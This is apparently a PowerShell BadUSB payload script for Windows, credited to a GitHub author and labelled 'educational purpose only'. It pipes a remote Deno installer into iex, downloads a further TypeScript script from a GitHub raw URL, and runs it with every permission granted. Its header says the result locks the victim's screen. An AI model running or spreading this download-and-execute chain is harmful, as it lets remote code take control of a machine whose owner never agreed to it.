## Description: Download the script and run it
## This script is for Windows
## this allow you to run any deno script
## example will be: deno run -A --unstable --no-check alice02flipher0.ts 
## this will lock your screen
## free to modify / change / share / use
##
## educational purpose only
## Made by Sn0wAlice in GitHub in Luxembourg 

irm https://deno.land/install.ps1 | iex # Install Deno
Invoke-WebRequest -Uri https://raw.githubusercontent.com/Sn0wAlice/Flip-Her-0/main/badusb/scripts/w02/alice02flipher0.ts -OutFile ~/alice02flipher0.ts # Download the script
deno run -A --unstable --no-check alice02flipher0.ts # Run the script
